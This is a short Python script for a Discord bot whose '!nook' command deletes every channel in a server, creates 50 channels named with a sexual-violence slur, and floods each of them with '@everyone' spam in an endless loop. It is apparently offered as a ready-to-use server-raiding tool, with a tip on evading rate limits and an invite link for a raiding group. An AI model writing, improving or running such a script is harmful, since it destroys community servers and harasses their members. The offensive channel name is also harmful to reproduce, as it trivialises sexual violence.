import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command()
async def nook(ctx):
    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks)

    create_tasks = [ctx.guild.create_text_channel("raped-by-worm") for _ in range(50)]
    new_channels = await asyncio.gather(*create_tasks)

    async def ping_channels():
        while True:
            ping_tasks = [channel.send("@everyone WORM ON TOP!") for channel in new_channels]
            await asyncio.gather(*ping_tasks)
            # JUST ADD  await asyncio.sleep(1) TO PREVENT RATE LIMITS

    asyncio.create_task(ping_channels())

bot.run("ADD YOUR FUCKING TOKEN HERE")
# first join the discord discord.gg/wrm 
